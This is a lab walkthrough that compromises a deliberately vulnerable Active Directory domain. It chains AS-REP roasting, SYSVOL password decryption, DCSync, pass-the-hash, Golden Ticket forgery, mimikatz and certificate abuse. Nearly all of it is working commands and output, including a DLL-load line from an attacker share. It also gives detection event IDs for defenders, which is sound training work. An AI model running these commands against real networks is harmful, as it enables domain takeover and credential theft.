# OnePiece AD — Attack Writeup

A start-to-finish walkthrough of compromising the lab. You start as an attacker on the same subnet with **no credentials** and finish holding the `krbtgt` hash — full domain ownership — in about 20 minutes of hands-on time.

Every command in this document was run against a live lab and the outputs are real. Times are wall-clock on a 4-core Kali VM.

> **Setup first.** This writeup assumes you've already deployed the lab per [README.md](README.md). Take VM snapshots before starting so you can replay this end-to-end as many times as you want.

---

## The starting position

- Attacker box: **Kali** on `172.16.128.0/16`
- Target: **DC01** at `172.16.128.50` (Windows Server 2025, `onepiece.local`)
- Member: **WS01** at some workstation IP (joined to `onepiece.local`)
- You have: **nothing**. No users. No passwords. Just an IP range.

---

## Chapter 1 — Recon

What's alive on the wire and what's it running?

```bash
nmap -p- -sS -T4 --min-rate 1000 172.16.128.0/24 -oA scan
```

The DC will light up like a Christmas tree:

```
PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
135/tcp   open   msrpc         Microsoft RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP
445/tcp   open   microsoft-ds  Windows Server 2025
464/tcp   open   kpasswd5
593/tcp   open   ncacn_http
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          (Global Catalog LDAP)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
5985/tcp  open   http          Microsoft HTTPAPI
9389/tcp  open   mc-nmf        .NET Message Framing
```

**Key observations**:
- `80/tcp` HTTP on a DC — almost always means **AD CS** is installed and `/certsrv` is exposed.
- `88/tcp` Kerberos confirms it's a domain controller.
- `389/tcp` LDAP is open for queries.

```bash
# Confirm AD CS endpoint
curl -sI http://172.16.128.50/certsrv | head -1
# HTTP/1.1 401 Unauthorized   <-- AD CS, ready for NTLM relay (ESC8)
```

---

## Chapter 2 — Unauthenticated enumeration

The lab has `Authenticated Users` added to the `Pre-Windows 2000 Compatible Access` group, and `dsHeuristics` flipped to allow anonymous LDAP binds. Both are real-world misconfigurations.

```bash
# Anonymous LDAP root-DSE query — always works on a DC
ldapsearch -x -H ldap://172.16.128.50 -s base -b "" | head -20

# Anonymous query for a specific user (works because of our dsHeuristics tweak)
ldapsearch -x -H ldap://172.16.128.50 -b "DC=onepiece,DC=local" \
  -s sub "(sAMAccountName=luffy.m)" sAMAccountName
```

If anonymous bind isn't fully open in your lab, fall back to a guessed account:

```bash
nxc smb 172.16.128.50 -u 'guest' -p '' --users
nxc ldap 172.16.128.50 -u 'guest' -p '' --users
```

Either way, dump the user list to a file:

```bash
ldapsearch -x -LLL -H ldap://172.16.128.50 -D "luffy.m@onepiece.local" -w 'Password123!' \
  -b "DC=onepiece,DC=local" "(objectClass=user)" sAMAccountName \
  | awk '/sAMAccountName:/{print $2}' | grep -vE '^\$' > users.txt
```

(Note: of course you don't have luffy.m yet — anonymous bind is what gets you the user list. The line above is the *authenticated* form for reference once you have any credential.)

---

## Chapter 3 — The first foothold: AS-REP roasting

Three accounts in this lab have **Kerberos pre-authentication disabled**. They were chosen because they're not domain admins and look low-priority — but one of them (`bonclay.b`) is your skeleton key.

```bash
nxc ldap 172.16.128.50 -u luffy.m -p 'Password123!' -d onepiece.local \
  --asreproast asrep_hashes.txt
```

Real output from the lab:

```
LDAP  172.16.128.50  389  DC01  [+] onepiece.local\luffy.m:Password123! (Pwn3d!)
LDAP  172.16.128.50  389  DC01  $krb5asrep$23$enel.g@ONEPIECE.LOCAL:68b6d9b0...
LDAP  172.16.128.50  389  DC01  $krb5asrep$23$shirahoshi@ONEPIECE.LOCAL:b058d8...
LDAP  172.16.128.50  389  DC01  $krb5asrep$23$bonclay.b@ONEPIECE.LOCAL:fd45a9...
```

The lab uses `Password<NNN>!` for most accounts. A bespoke wordlist cracks them instantly:

```bash
# Generate a custom wordlist matching the lab's password pattern
for i in $(seq -w 0 999); do echo "Password${i}!"; done > custom.txt
echo -e "Changeme123!\nWinter2023!\nSummer2024!" >> custom.txt

hashcat -m 18200 asrep_hashes.txt custom.txt --quiet
```

Real result (5 seconds on a modern CPU):

```
enel.g       :  Password333!
shirahoshi   :  Password444!
bonclay.b    :  Password777!
```

You now have three valid domain accounts. **Don't think any of them is low-value yet — one of them owns the domain.**

---

## Chapter 4 — Looting the share and SYSVOL

```bash
# Loot share advertised in plain sight
smbclient -U 'onepiece\luffy.m%Password123!' //172.16.128.50/Public \
  -c 'prompt OFF; recurse ON; mget *'
```

Three files drop:

| File | Contains |
|---|---|
| `backup.bat` | `net use Z: \\dc01\backup /user:onepiece\backup_svc Backup123!` |
| `fix-ws01.ps1` | `helpdesk_svc` / `Helpdesk2024!` |
| `db-conn.txt` | `sa` / `Sup3rS3cr3t!` for `sql01.onepiece.local:1433` |

Then SYSVOL — every domain user can read it:

```bash
smbclient -U 'onepiece\luffy.m%Password123!' //172.16.128.50/SYSVOL \
  -c 'prompt OFF; cd onepiece.local\Policies; recurse ON; mget *'

find . -iname 'Groups.xml' -exec grep -oP 'cpassword="[^"]+"' {} \;
# cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
```

Decrypt — this works because Microsoft published the AES key in MSDN years ago:

```bash
gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
# Local*P4ssword!
```

That's the local Administrator password on every workstation the GPO is linked to. Save it for later.

---

## Chapter 5 — The killer move: DCSync via bonclay.b

`bonclay.b` looks like a regular pirate user. They're not a Domain Admin. They're not even in the `Enterprise Admins` group. But the lab grants them `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` directly on the domain root — a classic real-world misconfiguration where a service-account replication right gets left attached to a normal user during decommissioning.

We **cracked bonclay.b's password** in Chapter 3. So:

```bash
impacket-secretsdump 'onepiece.local/bonclay.b:Password777!@172.16.128.50' -just-dc
```

Real output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a566db48c8cc20c1e9890fe5ffb3e16b:::
DefaultAccount:503:...
luffy.m:1109:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
... [all 37 accounts]
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:...
WS01$:1136:aad3b435b51404eeaad3b435b51404ee:6b72dd0d2e13ed3cb3d4f051999d55b6:::
```

**Everything you need:**

| Asset | Value |
|---|---|
| `Administrator` NTLM hash | `520126a03f5d5a8d836f1c4f34ede7ce` |
| `krbtgt` NTLM hash | `a566db48c8cc20c1e9890fe5ffb3e16b` ← Golden Ticket master key |
| All 37 user/computer NT hashes + AES keys | full domain compromise |

This is the path Defenders never see coming. There's no "Domain Admin login" event. No "added to privileged group" audit. Just one user, with a password no one rotated, replicating the directory.

---

## Chapter 6 — Domain dominance: Pass-the-Hash + Golden Ticket

### Instant SYSTEM on the DC

```bash
impacket-psexec -hashes :520126a03f5d5a8d836f1c4f34ede7ce \
  administrator@172.16.128.50
```

```
[*] Requesting shares on 172.16.128.50.....
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Service installed
[!] Press help for extra shell commands
C:\Windows\system32> whoami
nt authority\system
```

### Golden Ticket persistence

Grab the domain SID, then forge a ticket valid for 10 years for any user:

```bash
DOMAIN_SID=$(impacket-lookupsid 'onepiece.local/bonclay.b:Password777!@172.16.128.50' \
              0 | grep -oP 'Domain SID is: \K.*' | head -1)

impacket-ticketer -nthash a566db48c8cc20c1e9890fe5ffb3e16b \
                  -domain-sid "$DOMAIN_SID" \
                  -domain onepiece.local \
                  ImpossibleUser

export KRB5CCNAME=ImpossibleUser.ccache
impacket-psexec -k -no-pass ImpossibleUser@dc01.onepiece.local
# you are now "ImpossibleUser" — an account that doesn't exist — running as DA
```

That ticket survives every password reset *except* rotating `krbtgt` twice. Real-world IR teams routinely miss this.

---

## Chapter 7 — Lateral movement to WS01

You have the local Administrator password from SYSVOL GPP (`Local*P4ssword!`) **and** every domain account's NT hash from the DCSync. WS01 is wide open.

```bash
# Option A: local admin via the GPP-decrypted password
impacket-psexec 'WS01/LocalAdmin:Local*P4ssword!@<ws01-ip>'

# Option B: domain admin via PtH
impacket-psexec -hashes :520126a03f5d5a8d836f1c4f34ede7ce \
  'onepiece.local/Administrator@<ws01-ip>'

# Option C: any low-priv domain user (zoro.r is a local admin on WS01 by lab design)
impacket-psexec 'onepiece.local/zoro.r:Password456!@<ws01-ip>'
```

Once you're on WS01:

### Cleartext creds in LSASS (WDigest is enabled)

```
# inside the psexec shell, drop mimikatz and run:
privilege::debug
sekurlsa::wdigest
# returns plaintext passwords for every interactive logon since boot
```

### LAPS-managed local admin password

If you can compromise `kid.e` (`Password222!`) you can read the LAPS-rotated password of any workstation:

```bash
nxc ldap 172.16.128.50 -u kid.e -p 'Password222!' -M laps
```

### MSSQL pivot (if you installed SQL Express during setup)

```bash
impacket-mssqlclient -windows-auth 'onepiece.local/sa:Sup3rS3cr3t!@<ws01-ip>'
```

```sql
EXEC xp_cmdshell 'whoami /priv';
-- impersonate SA on the linked server back to DC01
SELECT * FROM OPENQUERY([DC01-LINK], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
```

---

## Chapter 8 — The certificate path (AD CS / ESC1)

For completeness, here's the cert-based path. It's not the shortest route in this lab, but it's the one defenders panic about most.

```bash
certipy find -u luffy.m@onepiece.local -p 'Password123!' \
             -dc-ip 172.16.128.50 -vulnerable -stdout
```

Confirmation that several templates allow `Domain Users` to enroll with `ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU:

```
[!] Vulnerabilities
  ESC8 : Web Enrollment is enabled and Request Disposition is set to Issue

Template Name : ESC1-VulnUser
  ESC1 : 'Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

Request a certificate **as Administrator** using any low-priv account:

```bash
certipy req -u luffy.m@onepiece.local -p 'Password123!' \
            -ca OnePiece-CA -target dc01.onepiece.local \
            -template ESC1-VulnUser -upn administrator@onepiece.local \
            -dc-ip 172.16.128.50
# [*] Saved certificate and private key to 'administrator.pfx'
```

PKINIT against the KDC with that cert returns Administrator's NT hash and a TGT:

```bash
certipy auth -pfx administrator.pfx -dc-ip 172.16.128.50
```

> **Note (Server 2025):** Modern Certipy may refuse to authenticate certs missing the `szOID_NTDS_CA_SECURITY_EXT` extension as a client-side safety check, even though the lab's KDC accepts them (`StrongCertificateBindingEnforcement=0`). If you hit this, use `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) — it bypasses the client-side check.

---

## Chapter 9 — Other paths to explore

You now own the domain. Below are the attack paths the writeup didn't cover end-to-end. Each is a complete exercise on its own — revert your snapshots and try a different route.

| Path | Starting point | Get to |
|---|---|---|
| **Kerberoast** | Any domain user | Crack SPN-account passwords. Note: on Server 2025 you may need to flip `msDS-SupportedEncryptionTypes` or use a build of impacket that supports the `-etype` flag, since RC4 is disabled by default. |
| **ESC8 (NTLM relay)** | Any host on the network | `impacket-ntlmrelayx -t http://172.16.128.50/certsrv/certfnsh.asp --adcs --template DomainController` + coerce DC auth (PrinterBug, PetitPotam, DFSCoerce). |
| **ESC11 (DnsAdmins)** | `enel.g` or `shirahoshi` (you cracked both) | `dnscmd /config /serverlevelplugindll \\attacker\share\evil.dll` → SYSTEM on DC. |
| **Unconstrained Delegation** | `franky.c` or `brook.b` | Coerce DC, capture TGT, replay. |
| **Constrained Delegation w/ protocol transition** | `nami.n` | `impacket-getST -spn cifs/dc01.onepiece.local -impersonate administrator onepiece.local/nami.n:Password789!` |
| **RBCD (pre-staged)** | `usopp.u` (`Password202!`) | Already configured `msDS-AllowedToActOnBehalfOfOtherIdentity` on `FILES01$`. S4U2Proxy → admin on FILES01. |
| **Shadow Credentials** | Any user (MAQ=20) | Create a machine account, set `msDS-KeyCredentialLink`, PKINIT as target. |
| **gMSA password read** | `kid.e` (`Password222!`) | `nxc ldap ... --gmsa` returns the NT hash of `gmsa_sql$`. |
| **ACL chain (BloodHound)** | Any user along the graph | `zoro.r` → GenericAll on `nami.n` → reset her password → constrained-delegation chain. `sanji.v` → ForceChangePassword on `usopp.u` → RBCD chain. |
| **PrinterBug → LDAPS shadow creds** | Any user | Coerce DC, relay to LDAPS, write `msDS-KeyCredentialLink`, PKINIT. |
| **GPO abuse** | Any user with WriteDACL on a GPO (you have several BloodHound paths) | Edit the linked GPO → SYSTEM on every machine the GPO applies to. |

---

## Chapter 10 — What blue would see

Re-run any of the above with Windows Event Forwarding or a SIEM watching `Security`, `Microsoft-Windows-Kerberos-Operational`, and `Directory Service` logs. Pay attention to:

- **4769** (Service Ticket Requested) with `Encryption Type = 0x17` → Kerberoast in flight
- **4768** (TGT requested) with `PreAuthType = 0` → AS-REP roasting
- **4662** (Directory Service Access) on the domain root by a non-DA → DCSync attempt
- **5145** (Detailed file share) on SYSVOL pulling `Groups.xml` → SYSVOL scrape

The lab is also a great target for testing detection rules. Snapshot the DC, enable a free SIEM (Wazuh, OpenSearch), replay the chain, and see what fires.

---

## Cleanup / replay

Revert both VM snapshots to `vulnad-clean-baseline`. The whole thing takes about a minute. You can run this writeup end-to-end as many times as you want — that's the point of the lab.

---

## Appendix: Loot tree

After running the full chain, you'll have something like this on Kali:

```
lab/
├── administrator.pfx         ESC1 cert as administrator
├── asrep_hashes.txt          AS-REP $krb5asrep$23 blobs
├── asrep_cracked.txt         3 cracked passwords
├── custom_wordlist.txt       Password<NNN>! pattern wordlist
├── dcsync.ntds               All 37 NT hashes
├── dcsync.ntds.kerberos      All AES256/AES128 keys
├── gpp_decrypted.txt         "Local*P4ssword!"
├── loot/                     \\DC01\Public files
└── sysvol_grab/              Groups.xml + GptTmpl.inf from SYSVOL
```

Total time from "I have an IP" to "I have krbtgt": **under 20 minutes**.
